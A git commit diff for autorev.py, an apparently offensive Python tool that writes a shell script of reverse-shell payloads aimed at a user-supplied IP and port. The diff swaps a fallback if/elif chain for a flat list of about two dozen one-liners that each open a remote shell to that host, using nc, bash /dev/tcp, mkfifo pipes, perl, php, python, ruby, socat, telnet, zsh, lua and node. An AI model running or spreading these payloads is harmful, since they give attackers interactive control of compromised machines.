8766e25e10b9235d75a8ed872580039d39dc9ddb
Boy From Future <82044074+root-tanishq@users.noreply.github.com>
2021-11-08 07:11:27 +0530

    Update autorev.py

--- autorev.py
+++ autorev.py
@@ -19,53 +19,30 @@ parser.add_argument('-o','--out', type=str ,help='Output File Name [Excluding (.
 args = parser.parse_args()
 print(f'[+]Generating a script for {args.ipaddr}:{args.port}')
 script = f'''
-if [ "$(nc -e /bin/sh {args.ipaddr} {args.port} ; echo $?)" == 0 ];then
-    echo "[-]Connection Lost";
-elif [ "$(sh -i >& /dev/tcp/{args.ipaddr}/{args.port} 0>&1 ; echo $?)" == 0 ];then
-    echo "[-]Connection Lost";
-elif [ "$(0<&196;exec 196<>/dev/tcp/{args.ipaddr}/{args.port}; sh <&196 >&196 2>&196 ; echo $?)" == 0 ];then
-    echo "[-]Connection Lost";
-elif [ "$(exec 5<>/dev/tcp/{args.ipaddr}/{args.port};cat <&5 | while read line; do $line 2>&5 >&5; done ; echo $?)" == 0 ];then
-    echo "[-]Connection Lost";
-elif [ "$(sh -i 5<> /dev/tcp/{args.ipaddr}/{args.port} 0<&5 1>&5 2>&5 ; echo $?)" == 0 ];then
-    echo "[-]Connection Lost";
-elif [ "$(sh -i >& /dev/udp/{args.ipaddr}/{args.port} 0>&1 ; echo $?)" == 0 ];then
-    echo "[-]Connection Lost";
-elif [ "$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {args.ipaddr} {args.port} >/tmp/f ; echo $?)" == 0 ];then
-    echo "[-]Connection Lost";
-elif [ "$(nc -c sh {args.ipaddr} {args.port} ; echo $?)" == 0 ];then
-    echo "[-]Connection Lost";
-elif [ "$(perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{args.ipaddr}:{args.port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' ; echo $?)" == 0 ];then
-    echo "[-]Connection Lost";
-elif [ "$(php -r '$sock=fsockopen("{args.ipaddr}",{args.port});exec("sh <&3 >&3 2>&3");' ; echo $?)" == 0 ];then
-    echo "[-]Connection Lost";
-elif [ "$(php -r '$sock=fsockopen("{args.ipaddr}",{args.port});shell_exec("sh <&3 >&3 2>&3");' ; echo $?)" == 0 ];then
-    echo "[-]Connection Lost";
-elif [ "$(php -r '$sock=fsockopen("{args.ipaddr}",{args.port});system("sh <&3 >&3 2>&3");' ; echo $?)" == 0 ];then
-    echo "[-]Connection Lost";
-elif [ "$(export RHOST="{args.ipaddr}";export RPORT={args.port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")' ; echo $?)" == 0 ];then
-    echo "[-]Connection Lost";
-elif [ "$(python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{args.ipaddr}",{args.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' ; echo $?)" == 0 ];then
-    echo "[-]Connection Lost";
-elif [ "$(export RHOST="{args.ipaddr}";export RPORT={args.port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")' ; echo $?)" == 0 ];then
-    echo "[-]Connection Lost";
-elif [ "$(python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{args.ipaddr}",{args.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' ; echo $?)" == 0 ];then
-    echo "[-]Connection Lost";
-elif [ "$(ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{args.ipaddr}",{args.port}))' ; echo $?)" == 0 ];then
-    echo "[-]Connection Lost";
-elif [ "$(socat TCP:{args.ipaddr}:{args.port} EXEC:sh ; echo $?)" == 0 ];then
-    echo "[-]Connection Lost";
-elif [ "$(require('child_process').exec('nc -e sh {args.ipaddr} {args.port}') ; echo $?)" == 0 ];then
-    echo "[-]Connection Lost";
-elif [ "$(TF=$(mktemp -u);mkfifo $TF && telnet {args.ipaddr} {args.port} 0<$TF | sh 1>$TF ; echo $?)" == 0 ];then
-    echo "[-]Connection Lost";
-elif [ "$(zsh -c 'zmodload zsh/net/tcp && ztcp {args.ipaddr} {args.port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY' ; echo $?)" == 0 ];then
-    echo "[-]Connection Lost";
-elif [ "$(lua -e "require('socket');require('os');t=socket.tcp();t:connect('{args.ipaddr}','{args.port}');os.execute('sh -i <&3 >&3 2>&3');" ; echo $?)" == 0 ];then
-    echo "[-]Connection Lost";
-else
-    echo "[+]Nothing Seems to work out"
-fi
+nc -e /bin/bash {args.ipaddr} {args.port} 
+nc -e /bin/sh {args.ipaddr} {args.port} 
+bash -c 'exec bash -i &>/dev/tcp/{args.ipaddr}/{args.port} <&1'
+sh -i >& /dev/tcp/{args.ipaddr}/{args.port} 0>&1
+0<&196;exec 196<>/dev/tcp/{args.ipaddr}/{args.port}; sh <&196 >&196 2>&196
+exec 5<>/dev/tcp/{args.ipaddr}/{args.port};cat <&5 | while read line; do $line 2>&5 >&5; done 
+sh -i 5<> /dev/tcp/{args.ipaddr}/{args.port} 0<&5 1>&5 2>&5 
+sh -i >& /dev/udp/{args.ipaddr}/{args.port} 0>&1 
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {args.ipaddr} {args.port} >/tmp/f 
+nc -c sh {args.ipaddr} {args.port} 
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{args.ipaddr}:{args.port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+php -r '$sock=fsockopen("{args.ipaddr}",{args.port});exec("sh <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("{args.ipaddr}",{args.port});shell_exec("sh <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("{args.ipaddr}",{args.port});system("sh <&3 >&3 2>&3");'
+export RHOST="{args.ipaddr}";export RPORT={args.port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{args.ipaddr}",{args.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+export RHOST="{args.ipaddr}";export RPORT={args.port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{args.ipaddr}",{args.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{args.ipaddr}",{args.port}))'
+socat TCP:{args.ipaddr}:{args.port} EXEC:sh
+require('child_process').exec('nc -e sh {args.ipaddr} {args.port}'
+TF=$(mktemp -u);mkfifo $TF && telnet {args.ipaddr} {args.port} 0<$TF | sh 1>$TF 
+zsh -c 'zmodload zsh/net/tcp && ztcp {args.ipaddr} {args.port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+lua -e "require('socket');require('os');t=socket.tcp();t:connect('{args.ipaddr}','{args.port}');os.execute('sh -i <&3 >&3 2>&3');"
 
 '''
 open(f'{args.out}.sh','w').write(script)
